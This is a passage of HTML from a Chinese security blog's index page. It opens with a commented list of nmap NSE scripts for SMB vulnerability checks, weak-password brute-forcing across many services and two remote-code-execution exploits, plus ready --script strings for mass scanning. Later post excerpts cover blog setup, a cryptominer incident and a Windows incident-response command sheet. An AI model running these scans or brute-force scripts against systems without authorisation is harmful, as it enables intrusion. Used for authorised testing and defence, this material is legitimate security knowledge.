smb</span></span><br><span class="line">smb-vuln-ms08-067</span><br><span class="line">smb-vuln-ms10-054</span><br><span class="line">smb-vuln-ms10-061</span><br><span class="line">smb-vuln-ms17-010	# 远程代码执行</span><br><span class="line"></span><br><span class="line">smb-enum-domains	# 域控制器信息收集，主机信息、用户、密码策略等</span><br><span class="line"></span><br><span class="line">smb-enum-users		# 域控制器扫描</span><br><span class="line"></span><br><span class="line">smb-enum-shares		# 遍历远程主机的共享目录</span><br><span class="line"></span><br><span class="line">smb-enum-processes	# 通过SMB对主机的系统进程进行遍历</span><br><span class="line"></span><br><span class="line">smb-enum-sessions	# 通过SMB获取域内主机的用户登录session，查看当前用户登录情况</span><br><span class="line"></span><br><span class="line">smb-os-discovery	# 通过SMB协议来收集目标主机的操作系统、计算机名、域名、全称域名、域林名称、NetBIOS机器名、NetBIOS域名、工作组、系统时间等</span><br><span class="line"></span><br><span class="line">smb-ls				# 列举共享目录内的文件，配合smb-enum-share使用</span><br><span class="line"></span><br><span class="line">smb-psexec			# 获取到SMB用户密码时可以通过smb-psexec在远程主机来执行命令</span><br><span class="line"></span><br><span class="line">smb-system-info		# 通过SMB协议获取目标主机的操作系统信息、环境变量、硬件信息以及浏览器版本等</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 弱密码爆破</span></span><br><span class="line">rsync-brute				# rsync 弱密码爆破</span><br><span class="line"></span><br><span class="line">rlogin-brute			# rlogin 弱密码爆破</span><br><span class="line"></span><br><span class="line">vnc-brute				# vnc 弱密码爆破</span><br><span class="line"></span><br><span class="line">pcanywhere-brute		# pcanywhere 弱密码爆破</span><br><span class="line"></span><br><span class="line">nessus-brute			# nessus 弱密码爆破</span><br><span class="line"></span><br><span class="line">snmp-brute				# snmap 弱密码爆破</span><br><span class="line">		</span><br><span class="line">telnet-brute			# telnet 弱密码爆破</span><br><span class="line"></span><br><span class="line">ldap-brute				# ldap 弱密码爆破</span><br><span class="line"></span><br><span class="line">pgsql-brute				#  postgresql 弱密码爆破</span><br><span class="line"></span><br><span class="line">oracle-brute-stealth	# oracle 弱密码爆破,隐身</span><br><span class="line"></span><br><span class="line">oracle-brute			# oracle 弱密码爆破</span><br><span class="line"></span><br><span class="line">mongodb-brute			# mongodb 弱密码爆破</span><br><span class="line"></span><br><span class="line">redis-brute				# redis 弱密码爆破</span><br><span class="line"></span><br><span class="line">xmpp-brute				# xmpp爆破</span><br><span class="line"></span><br><span class="line">ftp-brute				# ftp爆破脚本 [只会尝试一些比较简单的弱口令,时间可能要稍微长一些(挂vpn以后这个爆破速度可能会更慢)</span><br><span class="line">smtp-brute				# smtp 弱口令爆破</span><br><span class="line"></span><br><span class="line">pop3-brute 				# pop3 弱口令爆破</span><br><span class="line"></span><br><span class="line">imap-brute				# imap 弱口令爆破</span><br><span class="line"></span><br><span class="line">informix-brute			# informix爆破脚本</span><br><span class="line"></span><br><span class="line">mysql-brute				# mysql 弱密码爆破</span><br><span class="line"></span><br><span class="line">ms-sql-brute			# sa 弱密码爆破</span><br><span class="line"></span><br><span class="line">nexpose-brute			# nexpose 弱密码爆破</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> exploit</span></span><br><span class="line">http-vuln-cve2015-1427	# cve-2015-1427 ElasticSearch远程代码执行</span><br><span class="line"></span><br><span class="line">http-vuln-cve2014-8877 	# WordPress CM Download Manager远程代码执行</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> shodan</span></span><br><span class="line">shodan-api		# 使用shodan</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="综合利用"><a href="#综合利用" class="headerlink" title="综合利用"></a>综合利用</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 验证ssl漏洞</span></span><br><span class="line">--script sshv1,ssl-ccs-injection,ssl-cert,ssl-date,ssl-dh-params,ssl-enum-ciphers,ssl-google-cert-catalog,ssl-heartbleed,ssl-known-key,sslv2</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 常规漏洞扫描</span></span><br><span class="line">--script dns-zone-transfer,ftp-anon,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,http-backup-finder,http-cisco-anyconnect,http-iis-short-name-brute,http-put,http-php-version,http-shellshock,http-robots.txt,http-svn-enum,http-webdav-scan,iis-buffer-overflow,iax2-version,memcached-info,mongodb-info,msrpc-enum,ms-sql-info,mysql-info,nrpe-enum,pptp-version,redis-info,rpcinfo,samba-vuln-cve-2012-1182,smb-vuln-ms08-067,smb-vuln-ms17-010,snmp-info,sshv1,xmpp-info,tftp-enum,teamspeak2-version</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 常见服务弱密码爆破</span></span><br><span class="line">--script ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="其他脚本"><a href="#其他脚本" class="headerlink" title="其他脚本"></a>其他脚本</h4><p><a target="_blank" rel="noopener" href="https://github.com/s4n7h0/NSE">MS15-034、LFI、Nikto、ShellShock、tenda</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/digitalbond/Redpoint">枚举ICS程序和设备</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/DaniLabs/scripts-nse">路由器信息探测</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/kost/nmap-nse">Cassandra、WebSphere</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/jpalanco/nmap-scada">scada识别</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/b4ldr/nse-scripts">Hadoop、Flume、hbase、dns信息收集</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/peter-hackertarget/nmap-nse-scripts">wordpress基本信息,主题,插件探测</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/nosteve/vnc-auth">vnc auth</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/c-x/nmap-webshot">web services检测</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/michenriksen/nmap-scripts">apache,rails-xml探测</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/takeshixx/nmap-scripts">网关,dns探测</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ulissescastro/ya-nse-screenshooter">MacOS</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.polaris-lab.com/index.php/archives/390/">cms识别,目录探测,漏洞检测</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/axtl/nse-scripts">redis</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vicendominguez/http-enum-vodafone-hua253s">华为设备</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/aerissecure/nse">http header</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/cldrn/nmap-nse-scripts">nmap脚本库</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/lelybar/hydra.nse">hydra弱密码爆破</a></p>
+<h4 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h4><p><a target="_blank" rel="noopener" href="https://github.com/JKO/nsearch">NSE搜索引擎</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/s4n7h0/Halcyon">NSE开发工具</a></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://wizardforcel.gitbooks.io/nmap-man-page">nmap中文使用手册</a></p>
+<p><a target="_blank" rel="noopener" href="https://crayon-xin.github.io/2018/08/12/nmap%E8%B6%85%E8%AF%A6%E7%BB%86%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/">nmap超详细使用指南</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jiangliuzheng/article/details/51992220">nmap验证多种漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/149716.html">nmap常用官方脚本</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.polaris-lab.com/index.php/archives/390/">nmap脚本推荐</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://m09ic.top/posts/64867/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="M09ic">
+      <meta itemprop="description" content="网络安全,编程学习记录的破地方">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M09ic's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/64867/" class="post-title-link" itemprop="url">hexo博客搭建手记</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-05-17 09:40:39" itemprop="dateCreated datePublished" datetime="2019-05-17T09:40:39+08:00">2019-05-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-01-04 22:52:05" itemprop="dateModified" datetime="2021-01-04T22:52:05+08:00">2021-01-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index"><span itemprop="name">其他</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/posts/64867/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/posts/64867/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="0x00-开端"><a href="#0x00-开端" class="headerlink" title="0x00 开端"></a>0x00 开端</h2><p>搭建博客有两个主要目的,一个是学过的东西过个半年基本都忘了,特别是一些细节的东西,浏览器书签收藏了一堆,也基本没再打开过.另一方面也是想分享一些基本的东西,最开始会以总结为主.自己现在也有一些比较简单的研究,等更加深入一点就分享出来(太菜了,别打我)</p>
+<p>博客内容主要会以安全方向为主.</p>
+<p>选博客框架,首先就把wordpress这种笨重的东西排除了,不优雅.静态博客框架主要以Hexo , Jekyll,其他的不太了解.不选用jekyll主要是因为主题太多了,选择困难症发作,看了一个小时还没开始动手.还是hexo好,比较流行的主题next,功能强大,拓展丰富,唯一的缺点就是用的人太多,逼格稍微降低了点.这都是可以自己定制解决的事情.</p>
+<p>写这篇文章也不是教学向,毕竟都是网上都有的东西,单纯的记录下博客搭建的过程.</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/64867/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://m09ic.top/posts/35826/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="M09ic">
+      <meta itemprop="description" content="网络安全,编程学习记录的破地方">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M09ic's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/35826/" class="post-title-link" itemprop="url">记一次失败的挖矿病毒应急响应</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-05-12 19:15:10" itemprop="dateCreated datePublished" datetime="2019-05-12T19:15:10+08:00">2019-05-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-01-04 22:51:12" itemprop="dateModified" datetime="2021-01-04T22:51:12+08:00">2021-01-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/posts/35826/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/posts/35826/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>一个小伙伴的朋友说自己家里的windows server 2008 R2 服务中了挖矿木马让我看看.我也是第一次接触这东西,也就边学边弄了.</p>
+<p>服务上只装了个mssql 2008 和 管家婆ERP3 ,通过花生壳88端口映射到公网.</p>
+<p>服务器刚装好,只在公网开了三天,5月8日发现mssql 2008 上不去了,才发现中了挖矿木马,我去处理的时候已经是5月11日.</p>
+<p>总共花了五六个小时,只能勉强分析出攻击情况,无法彻底清理干净.但是挺好玩的,大概是在两个甚至更多木马在掐架.</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/35826/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://m09ic.top/posts/31524/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="M09ic">
+      <meta itemprop="description" content="网络安全,编程学习记录的破地方">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M09ic's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/31524/" class="post-title-link" itemprop="url">windows server 应急响应查表</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-05-09 10:19:14" itemprop="dateCreated datePublished" datetime="2019-05-09T10:19:14+08:00">2019-05-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-01-04 22:53:09" itemprop="dateModified" datetime="2021-01-04T22:53:09+08:00">2021-01-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/posts/31524/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/posts/31524/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <a id="more"></a>
+
+<h2 id="日志审计"><a href="#日志审计" class="headerlink" title="日志审计"></a>日志审计</h2><p>查询安全日志: <code>Get-WinEvent -FilterHashtable @&#123;LogName=&#39;Security&#39;&#125;</code><br>指定id查询: <code>Get-WinEvent -LogName Microsoft-Windows-PowerShell/Operational | Where-Object &#123;$_.ID -eq &quot;4100&quot; -or $_.ID -eq &quot;4104&quot;&#125;</code><br>指定时间查询: </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$StartTime&#x3D;Get-Date  -Year  2017  -Month  1  -Day  1  -Hour  15  -Minute  30</span><br><span class="line">$EndTime&#x3D;Get-Date  -Year  2017  -Month  2  -Day  15  -Hour  20  -Minute  00</span><br><span class="line"></span><br><span class="line">Get-WinEvent -FilterHashtable @&#123;LogName&#x3D;&#39;System&#39;;StartTime&#x3D;$StartTime;EndTime&#x3D;$EndTime&#125;</span><br></pre></td></tr></table></figure>
+<p>GUI: <code>eventvwr.msc</code>  </p>
+<style type="text/css">
+    table {width: 50%;}
+</style>
+
+<p>重要日志id: </p>
+<table>
+<thead>
+<tr>
+<th align="center">event id</th>
+<th align="center">description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">4624</td>
+<td align="center">登陆成功</td>
+</tr>
+<tr>
+<td align="center">4625</td>
+<td align="center">登陆失败</td>
+</tr>
+<tr>
+<td align="center">4720</td>
+<td align="center">创建用户</td>
+</tr>
+<tr>
+<td align="center">4726</td>
+<td align="center">删除用户</td>
+</tr>
+<tr>
+<td align="center">4738</td>
+<td align="center">用户账户更改</td>
+</tr>
+<tr>
+<td align="center">4698</td>
+<td align="center">创建计划任务</td>
+</tr>
+<tr>
+<td align="center">4700</td>
+<td align="center">启用计划任务</td>
+</tr>
+<tr>
+<td align="center">5025</td>
+<td align="center">关闭防火墙</td>
+</tr>
+<tr>
+<td align="center">5030</td>
+<td align="center">防火墙无法启动</td>
+</tr>
+<tr>
+<td align="center">7045</td>
+<td align="center">创建服务</td>
+</tr>
+<tr>
+<td align="center">7030</td>
+<td align="center">创建服务错误</td>
+</tr>
+<tr>
+<td align="center">18456</td>
+<td align="center">mssql登陆失败</td>
+</tr>
+</tbody></table>
+<h2 id="检查账户"><a href="#检查账户" class="headerlink" title="检查账户"></a>检查账户</h2><p>打开”本地和用户组”: <code>lusrmgr.msc</code><br>列出当前所有用户: <code>net user</code> , <code>wmic UserAccount get</code><br>用命令行无法列出隐藏用户,得在GUI界面看.或注册表: <code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account</code>  </p>
+<p>删除用户: <code>net user test$ /del</code></p>
+<h2 id="网络连接"><a href="#网络连接" class="headerlink" title="网络连接"></a>网络连接</h2><p>查看连接和监听的端口: <code>netstat -anob</code><br>路由: <code>netstat -rn</code><br>防火墙: <code>netsh firewall show all</code></p>
+<p>查到可疑链接的pid,再查进程.<br>可疑链接的ip可疑通过<a target="_blank" rel="noopener" href="https://x.threatbook.cn/">微步威胁情报</a>查询.  </p>
+<h2 id="进程分析"><a href="#进程分析" class="headerlink" title="进程分析"></a>进程分析</h2><p>导出进程参数:  <code>wmic process get caption,commandline /value &gt;&gt; tmp.txt</code><br>指定进程名称信息:  <code>wmic process | findstr &quot;name&quot; &gt;&gt; proc.csv</code><br>查看系统占用: <code>Get-Process</code><br>查看网络连接: <code>Get-NetTCPConnection</code><br>查看服务与进程对应关系: <code>tasklist /svc</code><br>查看进程与dll关系: <code>tasklist -M</code></p>
+<p>工具: <code>SysinternalsSuite</code>的<code>procexp </code></p>
+<h2 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h2><p>注册表开机自启位置: </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HKLM\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br><span class="line">HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run</span><br><span class="line">HKLM\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Run</span><br><span class="line">HKCU\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">(ProfilePath)\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure>
+<p><code> SysinternalsSuite</code> 工具集的 <code>Autoruns </code><br>GUI: <code>gpedit.msc</code>  </p>
+<h2 id="查看服务"><a href="#查看服务" class="headerlink" title="查看服务"></a>查看服务</h2><p>查看服务: <code>Get-Service</code><br>GUI: <code>services.msc</code>  </p>
+<h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\Tasks\</span><br><span class="line">C:\Windows\SysWOW64\Tasks\</span><br><span class="line">C:\Windows\tasks\</span><br><span class="line">*.job（指文件）</span><br></pre></td></tr></table></figure>
+<p>命令: <code>schtasks</code><br>(若报错运行<code>chcp 437</code>)<br>GUI: <code>taskschd.msc</code></p>
+<h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><p>火绒剑</p>
+<p>参考链接:<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2524">Windows 系统安全事件应急响应</a><br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/">Sysinternals Utilities Index</a><br><a target="_blank" rel="noopener" href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/">渗透技巧-Windows系统的帐户隐藏</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://m09ic.top/posts/16107/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="M09ic">
+      <meta itemprop="description" content="网络安全,编程学习记录的破地方">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M09ic's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/16107/" class="post-title-link" itemprop="url">Hello World</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-04-28 12:50:23" itemprop="dateCreated datePublished" datetime="2019-04-28T12:50:23+08:00">2019-04-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-01-04 22:52:17" itemprop="dateModified" datetime="2021-01-04T22:52:17+08:00">2021-01-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%94%9F%E6%B4%BB/" itemprop="url" rel="index"><span itemprop="name">生活</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/posts/16107/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/posts/16107/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>本来觉得大学几年学了不少东西,回过头去看到发现都只是留下一条浅浅的痕迹,未曾深入过任何一个领域,于是决定用blog激励自己.  </p>
+<p>现在有一个暂时的计划,先整理一些比较基础的内容,发一些最近参加的比赛的writeup(去年参加了十几场,writeup好多都丢失了,也都没了时效性,不补了.以后参加的比赛尽量写一篇wp),目标是做一些原创或者半原创的研究.</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/16107/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
+  </nav>
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">M09ic</p>
+  <div class="site-description" itemprop="description">网络安全,编程学习记录的破地方</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/M09Ic" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;M09Ic" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:m09ic@foxmail.com" title="E-Mail → mailto:m09ic@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
